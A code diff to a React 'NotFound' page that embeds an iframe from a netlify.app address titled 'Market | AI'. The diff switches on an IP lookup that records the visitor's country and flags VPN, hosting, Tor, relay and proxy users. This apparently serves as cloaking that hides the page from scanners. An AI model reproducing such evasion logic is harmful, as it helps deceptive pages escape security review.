@@ -5,7 +5,7 @@ import MetaIcon from '../resources/favicon2.ico';
 
 
 function NotFound() {
-  let[countryCode, setCountryCode] = useState('us');
+  let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://glittering-caramel-84e3c4.netlify.app');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Market | AI');
@@ -48,22 +48,22 @@ function NotFound() {
           if(ipAddress){
             fetch(`https://ipinfo.io/widget/demo/${ipAddress}`).then(d => d.json()).then(d => {
             let data = d.data;
-            // if(data){
-            //  var countryCode = data.country;
-            //   setCountryCode(countryCode.toLowerCase());
-            //   var privacy = data.privacy;
-            //   if(privacy){
-            //     if(
-            //       privacy.vpn == true
-            //       || privacy.hosting == true
-            //       || privacy.relay == true
-            //       || privacy.tor == true
-            //       || privacy.proxy == true
-            //     ){
-            //       SetUserHiden(true);
-            //     }
-            //   }
-            // }
+            if(data){
+             var countryCode = data.country;
+              setCountryCode(countryCode.toLowerCase());
+              var privacy = data.privacy;
+              if(privacy){
+                if(
+                  privacy.vpn == true
+                  || privacy.hosting == true
+                  || privacy.relay == true
+                  || privacy.tor == true
+                  || privacy.proxy == true
+                ){
+                  SetUserHiden(true);
+                }
+              }
+            }
           }); 
         }
       });
